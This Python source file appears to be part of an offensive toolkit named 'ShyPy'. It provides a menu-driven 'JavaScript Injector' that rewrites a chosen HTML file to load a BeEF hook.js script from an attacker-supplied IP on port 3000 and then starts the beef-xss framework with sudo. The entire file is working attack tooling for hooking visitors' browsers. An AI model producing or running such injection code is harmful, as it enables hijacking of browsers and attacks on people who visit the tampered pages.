import subprocess
import time
import os
import platform
from colorama import Fore as f
def clear_terminal():
    os_name = platform.system().lower()
    if os_name == "linux" or os_name == "darwin":
        os.system("clear")
    elif os_name == "windows":
        os.system("cls")

class Js_Injector():
    def __init__(self):
        self.ip = ""
        self.location = ""
        self.start()

    def start(self):
        clear_terminal()
        print(f"""
            ╔══════════════════════════════════════════════════════════════════════╗
            ║*                     - JavaScript Injector -                        *║
            ╠══════════════════════════════════════════════════════════════════════╣
            ║* RULES : Operating System Must Be Linux Or The Program Will Not Run. ║
            ╠══════════════════════════════════╦═══════════════════════════════════╣ 
            ║            Commands              ║            Function               ║    
            ╠══════════════════════════════════╬═══════════════════════════════════╣   
            ║ "set.ip"                         : Set Own IP.                       ║ 
            ║ "set.location"                   : Set Html File Location.           ║
            ║ "generate"                       : Generate a Js Injector.           ║
            ║ "back"                           : Back To Shypy.                    ║                              
            ╠══════════════════════════════════╬═══════════════════════════════════╣
            ║*             OWN IP              : {self.ip}
            ╠══════════════════════════════════╬═══════════════════════════════════╬
            ║*       HTML FİLE LOCATİON        : {self.location}
            ╠══════════════════════════════════╩═══════════════════════════════════╣            
            ║*                            - The ShyPy -                           *║ 
            ╚══════════════════════════════════════════════════════════════════════╝
            \n\n""")
        
        answer = input("[ShyPy]: ") 
              
        if answer.startswith("set.ip "):
            answer = answer.replace('set.ip ', '') 
            self.ip= answer
            self.start()
                   
        elif answer.startswith("set.location "):
            answer = answer.replace('set.location ', '') 
            self.location = answer
            self.start() 
        
        elif answer == "generate":
            if platform.system() == "Windows":
                print("[!] Invalid Operating System")
                time.sleep(1)
                self.start()
                
            else:
                self.add_hook(self.location, self.ip)
            
        elif answer == "back":
            os.system("cd ..")
            os.system("cd ..")
            os.system("python Shypy.py")
        else:
            print(f.LIGHTYELLOW_EX + "[!] Invalid Option" + f.LIGHTCYAN_EX)
            time.sleep(0.5)
            self.start()
    
    def add_hook(self, location, ip):
        try:
            with open(location, "r+", encoding="utf-8") as file:
                html = file.read()

                if "</head>" in html:
                    new_html = html.replace("</head>", f"\t<script src=http://{ip}:3000/hook.js> </script>\n" + "</head>")

                else:
                    new_html = f'<!DOCTYPE html>\n\
                                <html lang="en">\n\
                                <head>\n\t\
                                <meta charset="UTF-8">\n\t\
                                <meta http-equiv="X-UA-Compatible" content="IE=edge">\n\t\
                                <meta name="viewport" content="width=device-width, initial-scale=1.0">\n\t\
                                <title>Document</title>\n\t\
                                <script src="http://{ip}:3000/hook.js"></script>\n\
                                </head>\n\
                                <body>\n\n\
                                </body>\n\
                                </html>'

                file.seek(0)
                file.write(new_html)
                file.truncate()
                print("[+] Hook has been added successfully!")
                time.sleep(1)
                print("[*] Starting Beef...")

                try:
                    subprocess.call(["sudo", "beef-xss", "start"])
                except:
                    print("[!] Beef is not installed on your system!")

        except FileNotFoundError:
            print(f.LIGHTYELLOW_EX +"[!] Invalid file location!")
            time.sleep(1)
            self.start()
        except IsADirectoryError:
            print(f.LIGHTYELLOW_EX +"[!] Invalid file location!")
            time.sleep(1)
            self.start()

JsIn = Js_Injector()